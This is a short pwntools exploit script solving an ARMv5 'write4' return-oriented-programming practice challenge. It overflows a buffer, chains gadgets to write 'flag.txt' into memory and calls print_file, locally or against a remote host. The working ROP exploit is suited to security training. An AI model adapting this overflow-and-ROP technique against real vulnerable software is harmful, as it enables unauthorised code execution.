from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./write4_armv5")


class ROPS:
    str_r3_r4 = 0x000105ec  # str r3, [r4]; pop {r3, r4, pc};
    pop_r3_r4 = 0x000105f0  # pop {r3, r4, pc};
    mov_r0_r3 = 0x000105c8  # mov r0, r3; pop {fp, pc};


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROPS.pop_r3_r4,
        b"flag",
        elf.sym.data_start,
        ROPS.str_r3_r4,
        b".txt",
        elf.sym.data_start + 4,
        ROPS.str_r3_r4,
        elf.sym.data_start,
        0xDEADBEEF,
        ROPS.mov_r0_r3,
        0xDEADBEEF,
        elf.sym.print_file
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()